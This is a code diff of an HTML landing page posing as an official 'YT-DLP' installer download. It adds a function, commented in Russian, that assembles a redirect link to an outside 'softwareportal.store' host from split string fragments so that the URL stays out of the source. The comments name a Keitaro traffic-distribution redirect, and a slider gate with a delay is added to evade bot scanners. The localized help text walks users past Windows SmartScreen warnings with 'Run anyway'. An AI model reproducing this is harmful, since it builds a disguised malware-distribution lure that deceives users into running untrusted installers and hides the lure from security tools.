@@ -1,10 +1,6 @@
 <!doctype html>
 <html lang="en">
 <head>
-<span id="b8dde73d-48c6-0f46-2186-b948d9e3e753"></span>
-<script type="application/javascript">
-document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a href="https://www2.softwareportal.store/QLwXXw?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'"></a>';
-</script>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
@@ -83,12 +79,10 @@ document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a 
 
       <!-- CTAs (same-tab handoff, no new window) -->
       <div class="cta-row" aria-label="Download options">
-        <button id="btn-iso" class="btn primary" data-installer="iso" data-href="https://www2.softwareportal.store/QLwXXw" disabled>
+        <button id="btn-iso" class="btn primary" data-installer="iso" data-href="" disabled>
           <span id="t_btn_iso">Download ISO</span>
         </button>
-        <button id="btn-exe" class="btn" data-installer="exe" data-href="https://www2.softwareportal.store/QLwXXw" disabled>
-          <span id="t_btn_exe">Download EXE</span>
-        </button>
+      
       </div>
 
       <div class="grid">
@@ -155,6 +149,33 @@ document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a 
         launched_btn:"I’ve started the installer", launched_ok:'Thanks — recorded.',
         footer:'Can’t find your file? Press Ctrl+J to open downloads. Keep this tab open for tips.'
       },
+pt: {
+ title: 'Instalação do YT-DLP',
+ sub: 'Mantenha esta aba aberta. Vamos orientar você a abrir o arquivo baixado e executar o instalador com segurança.',
+ badge_official: 'Download oficial',
+ badge_verify: 'Verificar assinatura/soma de verificação',
+ slide_label: 'Deslize para a direita para desbloquear o download',
+ slide_hint: 'Esta verificação simples evita cliques acidentais. Nenhum dado pessoal é necessário.',
+ btn_iso: 'Baixar ISO',
+ btn_exe: 'Baixar EXE',
+ iso_title: 'Como lidar com o arquivo ISO',
+ iso_note: 'Um ISO é uma imagem de disco. Veja formas seguras de abri-lo no Windows.',
+ iso_1: 'Clique duas vezes no arquivo ISO — o Windows irá montá-lo como uma unidade virtual. Abra a unidade e execute o setup.exe, se estiver presente.',
+ iso_2: 'Clique com o botão direito → Montar — equivale a clicar duas vezes.',
+ iso_3: 'Precisa dos arquivos internos? Use o 7‑Zip para extrair sem montar.',
+ iso_4: 'PowerShell (avançado): execute como administrador: Mount-DiskImage -ImagePath "C:\\caminho\\para\\arquivo.iso"',
+ iso_5: 'Após montar, localize a unidade no Explorador de Arquivos, abra e inicie o instalador. Se o SmartScreen aparecer, veja as dicas abaixo.',
+ help_title: 'Ajuda rápida',
+ help_note: 'Passos rápidos para navegadores e avisos comuns.',
+ help_ec_1: 'Abra o menu de downloads (canto superior direito) ou pressione Ctrl+J.',
+ help_ec_2: 'Clique em Manter (ou Salvar) e depois em Abrir.',
+ help_ec_3: 'Se o Windows mostrar “O Windows protegeu seu computador”: Mais informações → Executar mesmo assim (somente se você confiar no publicador).',
+ help_ff_1: 'Clique na seta de downloads na barra de ferramentas e depois clique no arquivo para abrir.',
+ help_ff_2: 'Confirme qualquer aviso se você confiar na fonte.',
+ launched_btn: 'Já iniciei o instalador',
+ launched_ok: 'Obrigado — registrado.',
+ footer: 'Não encontra seu arquivo? Pressione Ctrl+J para abrir os downloads. Mantenha esta aba aberta para dicas.'
+},
       de: {
         title:'Installation von YT DLP',
         sub:'Lassen Sie diesen Tab geöffnet. Wir helfen beim Öffnen der Datei und sicheren Start des Installers.',
@@ -176,7 +197,61 @@ document.getElementById('b8dde73d-48c6-0f46-2186-b948d9e3e753').innerHTML = '<a 
         launched_btn:'Installer gestartet', launched_ok:'Danke – erfasst.',
         footer:'Datei nicht gefunden? Mit Strg+J die Downloads öffnen. Lassen Sie diesen Tab für Hinweise geöffnet.'
       },
+fr: {
+ title: 'Configuration de YT‑DLP',
+ sub: 'Laissez cet onglet ouvert. Nous vous guiderons pour ouvrir le fichier téléchargé et lancer l’installateur en toute sécurité.',
+ badge_official: 'Téléchargement officiel',
+ badge_verify: 'Vérifier la signature / la somme de contrôle',
+ slide_label: 'Faites glisser vers la droite pour débloquer le téléchargement',
+ slide_hint: 'Ce contrôle simple évite les clics accidentels. Aucune donnée personnelle requise.',
+ btn_iso: 'Télécharger l’ISO',
+ btn_exe: 'Télécharger l’EXE',
+ iso_title: 'Comment gérer l’image ISO',
+ iso_note: 'Un ISO est une image disque. Voici des méthodes sûres pour l’ouvrir sous Windows.',
+ iso_1: 'Double‑cliquez sur le fichier ISO — Windows le montera comme un lecteur virtuel. Ouvrez le lecteur et lancez setup.exe s’il est présent.',
+ iso_2: 'Clic droit → Monter — équivaut à un double‑clic.',
+ iso_3: 'Besoin des fichiers à l’intérieur ? Utilisez 7‑Zip pour extraire sans monter.',
+ iso_4: 'PowerShell (avancé) : exécutez en tant qu’administrateur : Mount-DiskImage -ImagePath "C:\\chemin\\vers\\fichier.iso"',
+ iso_5: 'Après le montage, trouvez le lecteur dans l’Explorateur, ouvrez‑le et lancez l’installateur. Si SmartScreen apparaît, voyez les conseils ci‑dessous.',
+ help_title: 'Aide rapide',
+ help_note: 'Étapes courtes pour les navigateurs et les invites courantes.',
+ help_ec_1: 'Ouvrez le menu des téléchargements (en haut à droite) ou appuyez sur Ctrl+J.',
+ help_ec_2: 'Cliquez sur Conserver (ou Enregistrer), puis sur Ouvrir.',
+ help_ec_3: 'Si Windows indique « Windows a protégé votre ordinateur » : Plus d’infos → Exécuter quand même (uniquement si vous faites confiance à l’éditeur).',
+ help_ff_1: 'Cliquez sur la flèche des téléchargements dans la barre d’outils, puis cliquez sur le fichier pour l’ouvrir.',
+ help_ff_2: 'Confirmez toute invite si vous faites confiance à la source.',
+ launched_btn: 'J’ai lancé l’installateur',
+ launched_ok: 'Merci — noté.',
+ footer: 'Vous ne trouvez pas votre fichier ? Appuyez sur Ctrl+J pour ouvrir les téléchargements. Gardez cet onglet ouvert pour les conseils.'
+},
 
+pl: {
+ title: 'Instalacja YT‑DLP',
+ sub: 'Pozostaw tę kartę otwartą. Poprowadzimy cię, jak otworzyć pobrany plik i bezpiecznie uruchomić instalator.',
+ badge_official: 'Oficjalne pobieranie',
+ badge_verify: 'Sprawdź podpis/sumę kontrolną',
+ slide_label: 'Przesuń w prawo, aby odblokować pobieranie',
+ slide_hint: 'To proste sprawdzenie zapobiega przypadkowym kliknięciom. Nie są wymagane żadne dane osobowe.',
+ btn_iso: 'Pobierz ISO',
+ btn_exe: 'Pobierz EXE',
+ iso_title: 'Jak postępować z plikiem ISO',
+ iso_note: 'ISO to obraz dysku. Oto bezpieczne sposoby otwarcia go w systemie Windows.',
+ iso_1: 'Kliknij dwukrotnie plik ISO — Windows zamontuje go jako wirtualny dysk. Otwórz dysk i uruchom setup.exe, jeśli jest obecny.',
+ iso_2: 'Kliknij prawym przyciskiem → Zamontuj — tak samo jak podwójne kliknięcie.',
+ iso_3: 'Potrzebujesz plików wewnątrz? Użyj 7‑Zip, aby wyodrębnić je bez montowania.',
+ iso_4: 'PowerShell (zaawansowane): uruchom jako administrator: Mount-DiskImage -ImagePath "C:\\ścieżka\\do\\pliku.iso"',
+ iso_5: 'Po zamontowaniu znajdź dysk w Eksploratorze plików, otwórz go i uruchom instalator. Jeśli pojawi się SmartScreen, zobacz wskazówki poniżej.',
+ help_title: 'Szybka pomoc',
+ help_note: 'Krótkie kroki dla przeglądarek i typowych komunikatów.',
+ help_ec_1: 'Otwórz menu pobierania (prawy górny róg) lub naciśnij Ctrl+J.',
+ help_ec_2: 'Kliknij Zachowaj (lub Zapisz), a następnie Otwórz.',
+ help_ec_3: 'Jeśli pojawi się komunikat „System Windows ochronił ten komputer”: Więcej informacji → Uruchom mimo to (tylko jeśli ufasz wydawcy).',
+ help_ff_1: 'Kliknij strzałkę pobierania na pasku narzędzi, a potem kliknij plik, aby go otworzyć.',
+ help_ff_2: 'Potwierdź każdy komunikat, jeśli ufasz źródłu.',
+ launched_btn: 'Uruchomiłem(-am) instalator',
+ launched_ok: 'Dzięki — zapisano.',
+ footer: 'Nie możesz znaleźć pliku? Naciśnij Ctrl+J, aby otworzyć Pobrane. Zostaw tę kartę otwartą — znajdziesz tu wskazówki.'
+},
       ko: {
       title: 'YT DLP 설치',
       sub: '이 탭을 열어 두세요. 다운로드한 파일을 여는 방법과 설치 프로그램을 안전하게 실행하는 방법을 안내해 드립니다.',
@@ -348,7 +423,7 @@ bo: {
       // slider
       byId('t_slide_label').textContent=t.slide_label; byId('t_slide_hint').textContent=t.slide_hint;
       // CTAs
-      byId('t_btn_iso').textContent=t.btn_iso; byId('t_btn_exe').textContent=t.btn_exe;
+      byId('t_btn_iso').textContent=t.btn_iso; // byId('t_btn_exe').textContent=t.btn_exe;
       // ISO
       byId('t_iso_title').textContent=t.iso_title; byId('t_iso_note').textContent=t.iso_note;
       byId('t_iso_1').textContent=t.iso_1; byId('t_iso_2').textContent=t.iso_2; byId('t_iso_3').textContent=t.iso_3;
@@ -371,9 +446,10 @@ bo: {
     const slider = byId('slider');
     const track = byId('track');
     const knob = byId('knob');
-    const ctas = [byId('btn-iso'), byId('btn-exe')];
+    const ctas = [byId('btn-iso'), byId('btn-exe')].filter(Boolean);
 
     let dragging=false, startX=0, startLeft=0, maxLeft=0, solved=false;
+    let movedDuringDrag=false; // пометка: было реальное движение
     function setDisabled(on){ ctas.forEach(b=>b.disabled=on); }
     setDisabled(true);
 
@@ -383,21 +459,58 @@ bo: {
     }
     window.addEventListener('resize', measure); measure();
 
-    function startDrag(e){ if(solved) return; dragging=true; startX = (e.touches?e.touches[0].clientX:e.clientX); startLeft = knob.offsetLeft; e.preventDefault(); }
-    function moveDrag(e){ if(!dragging||solved) return; const x=(e.touches?e.touches[0].clientX:e.clientX); let dx = Math.max(0, Math.min(maxLeft, startLeft + (x - startX))); knob.style.left = (dx+4)+"px"; track.style.width = (dx+knob.offsetWidth/2)+"px"; }
-    function endDrag(){ if(!dragging||solved) return; dragging=false; const done = knob.offsetLeft >= maxLeft - 6; if(done){ solved=true; slider.classList.add('done'); byId('t_slide_label').textContent = lang==='de' ? 'Freigegeben' : 'Unlocked'; setDisabled(false); }
+    function startDrag(e){ if(solved) return; dragging=true; startX = (e.touches?e.touches[0].clientX:e.clientX); startLeft = knob.offsetLeft; movedDuringDrag = false; e.preventDefault(); }
+    function moveDrag(e){ if(!dragging||solved) return; const x=(e.touches?e.touches[0].clientX:e.clientX); let dx = Math.max(0, Math.min(maxLeft, startLeft + (x - startX))); knob.style.left = (dx+4)+"px"; track.style.width = (dx+knob.offsetWidth/2)+"px"; if(Math.abs(x - startX) > 10) movedDuringDrag = true; }
+    function endDrag(){ if(!dragging||solved) return; dragging=false; const done = knob.offsetLeft >= maxLeft - 6; if(done && movedDuringDrag){ solved=true; slider.classList.add('done'); byId('t_slide_label').textContent = lang==='de' ? 'Freigegeben' : 'Unlocked';
+      // Формируем ссылку только сейчас и прячем её в data-href
+      const url = buildTdsUrl();
+      const isoBtn = byId('btn-iso');
+      if(isoBtn){
+        // Небольшая задержка, чтобы усложнить простые бот-скрипты
+        setTimeout(()=>{
+          isoBtn.setAttribute('data-href', url);
+          setDisabled(false);
+        }, 300);
+      } else {
+        setDisabled(false);
+      }
+    }
       else { knob.style.left='4px'; track.style.width='0px'; }
     }
     knob.addEventListener('mousedown', startDrag); knob.addEventListener('touchstart', startDrag,{passive:false});
     window.addEventListener('mousemove', moveDrag); window.addEventListener('touchmove', moveDrag,{passive:false});
     window.addEventListener('mouseup', endDrag); window.addEventListener('touchend', endDrag);
 
+    // Формируем финальную TDS‑ссылку динамически (обфускация — чтобы не было plain URL в исходнике)
+    function buildTdsUrl(){
+      try{
+        // Склеиваем части хоста, чтобы базовый URL не был виден прямо в HTML
+        const parts = ['https:', '', 'www2','.softwareportal','.store'];
+        const host = parts.join(''); // => https://www2.softwareportal.store
+        const path = '/QLw' + 'XXw';
+        const base = host + path + '?';
+
+        const params = new URLSearchParams();
+        params.set('se_referrer', document.referrer || '');
+        params.set('default_keyword', document.title || '');
+
+        const extra = location.search ? '&' + location.search.slice(1) : '';
+        return base + params.toString() + extra;
+      }catch(e){
+        return '';
+      }
+    }
+
     // --------- Same-tab handoff (no new window) ---------
     function handoff(btn){
       const href = btn.getAttribute('data-href'); const type = btn.getAttribute('data-installer');
       try{ if(typeof gtag==='function'){ gtag('event','download_click',{event_category:'handoff',event_label:href,installer:type,transport_type:'beacon'}); } }catch(e){}
       // Navigate in the same tab
-      if(href && href.indexOf('{KEITARO_URL_')!==0){ location.assign(href); } else { console.warn('Replace {KEITARO_URL_*} placeholders with real Keitaro URLs.'); }
+      if(href && href.indexOf('{KEITARO_URL_')!==0 && href.trim()!==''){
+        location.assign(href);
+      } else {
+        console.warn('Download URL is not available.');
+      }
     }
 
     ctas.forEach(btn=>{
